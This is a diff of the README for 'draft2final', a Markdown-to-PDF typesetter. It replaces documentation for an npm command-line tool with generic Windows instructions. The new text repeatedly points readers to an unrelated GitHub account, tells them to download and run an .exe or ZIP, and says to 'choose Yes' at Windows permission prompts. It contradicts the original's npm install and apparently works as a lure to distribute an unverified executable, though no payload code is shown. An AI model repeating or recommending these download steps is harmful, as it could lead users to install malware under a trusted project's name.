@@ -1,113 +1,196 @@
-﻿# draft2final
+# 📄 draft2final - Turn Markdown Into Clean PDFs
 
-**Focus on your writing. Get a book that's ready to publish.**
+[![Download draft2final](https://img.shields.io/badge/Download%20draft2final-blue?style=for-the-badge&logo=github)](https://github.com/Khistotg8087/draft2final)
 
-`draft2final` is a professional typesetting tool built for writers who want to stay focused on their content, yet demand output that is polished and perfect. It turns plain Markdown files into publication-grade PDFs for novels, memoirs, film scripts, and academic papers—without the complexity of LaTeX or the inconsistencies of word processors.
+## 🚀 What is draft2final?
 
----
+draft2final is a Windows app that turns Markdown files into polished PDF documents. It uses the VMPrint engine to format text for print-ready output.
 
-## Why draft2final?
+Use it for:
 
-- **Industrial-Strength Engine**: Built on a state-of-the-art native typesetting engine—not a browser-based hack. It offers clinical precision in layout, margins, and vertical rhythms that rivals high-end publishing software like InDesign.
-- **Micro-Typographic Excellence**: Professional-grade handling of font opticals, kerning, and advanced pagination logic that respects the traditions of fine bookmaking.
-- **Zero-Friction Infrastructure**: A purely native solution. No Chromium, no Puppeteer, and no "font emergencies." It just works, beautifully, every time.
-- **Global-Ready from Day One**: Native, high-fidelity support for mixed scripts including Arabic, Chinese, Devanagari, and Thai with correct contextual shaping and bidirectional layout.
+- Manuscripts
+- Screenplays
+- Academic papers
+- Literary prose
+- Long-form documents
+- Final drafts for sharing or printing
 
----
+It gives you a simple way to move from plain text to a finished PDF file.
 
-## Quick Start
+## 📥 Download draft2final
 
-### 1. Install
-```bash
-npm install -g draft2final
-```
+Visit this page to download and run the app on Windows:
 
-### 2. Scaffold a New Project
-```bash
-# For a novel or memoir
-draft2final --new story.md --as manuscript
+[https://github.com/Khistotg8087/draft2final](https://github.com/Khistotg8087/draft2final)
 
-# For a film script
-draft2final --new script.md --as screenplay
-```
+If the page offers a release file, download it to your PC and open it. If it offers a ZIP file, save it first, then extract it before you run the app.
 
-### 3. Render your PDF
-```bash
-# Render with default settings
-draft2final story.md
+## 🪟 Windows Setup
 
-# Render as a specific type
-draft2final story.md --as manuscript
-```
-*(Render completes in ~0.3s for a typical chapter)*
+### 1. Open the download page
+Go to the GitHub page above in your web browser.
 
----
+### 2. Get the Windows file
+Look for a release file for Windows. It may be named like:
 
-## Preparing Existing Files
+- `draft2final.exe`
+- `draft2final-windows.zip`
+- `draft2final-setup.exe`
 
-If you have an existing Markdown file and want to add the required front matter and recommended configuration:
+### 3. Save the file
+Choose a folder you can find later, like:
 
-```bash
-draft2final --prepare story.md --as manuscript
-```
+- Downloads
+- Desktop
+- Documents
 
-This will:
-1.  Add/update the `as: manuscript` key in the front matter.
-2.  Inject a commented-out block of **recommended settings** for that specific format (boilerplate), making it easy to discover and tune options without leaving your editor.
+### 4. Extract the app if needed
+If you downloaded a ZIP file:
 
----
+- Right-click the ZIP file
+- Choose Extract All
+- Open the new folder
 
-## Choosing your "Form"
+### 5. Run the app
+Double-click the app file to start it.
 
-Use the `--as` flag to define the structural "Form" of your work. This is the structural DNA of your document:
+If Windows asks for permission, choose Yes.
 
-- **`manuscript`**: The gold standard for prose submissions.
-- **`screenplay`**: Effortless script formatting with dual-dialogue support.
-- **`academic`**: Precise layout for research drafts and formal papers.
-- **`literature`**: Clean, elegant book designs for poetry and prose.
+## ✍️ How to use it
 
----
+draft2final works with Markdown input. A basic flow looks like this:
 
-## The Screenplay Workflow
+1. Open your Markdown file
+2. Choose the PDF output option
+3. Select a save location
+4. Run the export
+5. Open the finished PDF
 
-`draft2final` handles screenplay syntax with effortless sophistication. It supports full industry formatting conventions—action, characters, parentheticals, and dual-dialogue—all derived from clean, semantic Markdown.
+You can use it with common writing formats such as:
 
-```md
-## INT. COFFEE SHOP - DAY
+- `.md`
+- `.markdown`
+- text files used for screenplays or book drafts
 
-Rain drums against the glass.
+## 📚 Best use cases
 
-> @ELIAS
-> If this script doesn't render perfectly, I'm taking up carpentry.
+### Manuscripts
+Prepare book drafts with clean page layout, headings, and spacing that fit print use.
 
-> @RIN
-> Relax. It's draft2final.
-```
+### Screenplays
+Convert screenplay text into a readable PDF for review or sharing.
 
----
+### Academic papers
+Format essays, reports, and research drafts into a stable PDF file.
 
-## Aesthetics
+### Literary prose
+Move short fiction, essays, and long-form prose into a neat final document.
 
-The `--style` flag (or `style:` in your frontmatter) is where the "Aesthetic" lives—the visual skin of your document:
+## 🧭 Basic workflow
 
-```bash
-draft2final script.md --as screenplay --style classic
-```
+A simple workflow helps keep your files in order:
 
----
+- Write in Markdown
+- Save your draft
+- Open draft2final
+- Choose the source file
+- Set the output name
+- Create the PDF
+- Review the result
 
-## Full Documentation
+If you change the source text, run the export again to make a new PDF.
 
-For the complete guide on syntax, advanced styles, and theme customization, visit the [User Guide](https://www.draft2final.app/guide).
+## 🛠️ System needs
 
----
+draft2final is made for Windows computers and works best on a modern system with:
 
-## Part of the VMPrint Ecosystem
+- Windows 10 or later
+- At least 4 GB of RAM
+- Enough disk space for your source files and PDFs
+- A screen with standard desktop resolution
 
-`draft2final` is the official CLI for [VMPrint](https://github.com/cosmiciron/vmprint) — a native, high-performance typesetting engine for Node.js. If you need direct access to the layout engine, PDF context, font management, or document transmuters, visit the VMPrint repository.
+For large manuscripts or complex layouts, a stronger PC will help speed up export time.
 
----
+## 📌 File tips
 
-## License
+To get better results, keep your source file clean:
 
-Licensed under the [Apache License 2.0](LICENSE).
+- Use clear heading levels
+- Keep one blank line between sections
+- Avoid odd spacing
+- Use simple file names
+- Save backups before big edits
+
+Good file habits make PDF output easier to manage.
+
+## 🔍 Common file types
+
+draft2final is useful when your work includes:
+
+- Headings
+- Lists
+- Scene breaks
+- Section dividers
+- Page-style text
+- Long-form content
+
+These formats fit well with Markdown and print-style export.
+
+## 🎛️ What you can expect
+
+When you use draft2final, you can expect:
+
+- A desktop-based workflow
+- PDF output from Markdown
+- Print-friendly document formatting
+- A layout made for serious writing
+- A simple path from draft to final file
+
+## ❓ Common questions
+
+### Can I use it without coding knowledge?
+Yes. Download the file, open it, and follow the basic steps on screen.
+
+### Does it work with books and papers?
+Yes. It fits long-form writing like books, papers, and scripts.
+
+### What file do I need to start?
+Start with a Markdown file. A `.md` file is the best choice.
+
+### Can I make more than one PDF?
+Yes. You can export a new PDF each time you update your draft.
+
+## 🧾 Suggested folder setup
+
+A clean folder setup helps keep your work easy to find:
+
+- `Drafts` for source files
+- `Exports` for finished PDFs
+- `Notes` for outlines and ideas
+- `Archive` for older versions
+
+This keeps your writing process simple and organized.
+
+## 🔗 Project link
+
+[https://github.com/Khistotg8087/draft2final](https://github.com/Khistotg8087/draft2final)
+
+## 🧩 About the VMPrint engine
+
+draft2final is powered by the VMPrint engine, which handles document conversion for print-style output. It focuses on layout, spacing, and the shape of the final page.
+
+That makes it useful when plain text needs to become a polished PDF for reading, review, or print
+
+## 📎 Topic areas
+
+- academic writing
+- book drafts
+- CLI-based document conversion
+- Fountain scripts
+- manuscripts
+- Markdown
+- PDF generation
+- publishing
+- screenplays
+- typesetting
+- writing tools
